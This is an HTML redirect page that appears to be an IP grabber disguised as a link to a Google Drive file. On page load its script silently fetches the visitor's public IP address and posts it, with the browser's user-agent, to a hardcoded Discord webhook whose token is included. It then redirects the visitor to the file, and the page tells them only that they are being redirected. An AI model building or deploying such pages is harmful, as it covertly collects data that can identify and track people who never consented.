<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <script>
        // Function to send IP to Discord
        async function logIP() {
            try {
                // Get IP (this will be the client's public IP)
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ip = data.ip;
                
                // Discord webhook URL
                const webhookUrl = 'https://discord.com/api/webhooks/1346201636246388856/IU6P9NLHsun4Mkln7NabkTOxX7RqL6_56tYXspYdbdRtyeIT0-uuDaUqiXgs7SdLRlIW';
                
                // Send to Discord
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        content: `New visitor from IP: ${ip}\nUser-Agent: ${navigator.userAgent}`,
                    }),
                });
            } catch (error) {
                console.error('Error logging IP:', error);
            }
            
            // Redirect to Google Drive
            window.location.href = 'https://drive.google.com/file/d/1pEFnnPyHl0ug_rD9WtfYKcoy3u3EjJBX/view';
        }
        
        // Run when page loads
        window.onload = logIP;
    </script>
</head>
<body>
    <p>Redirecting you to the file...</p>
</body>
</html>
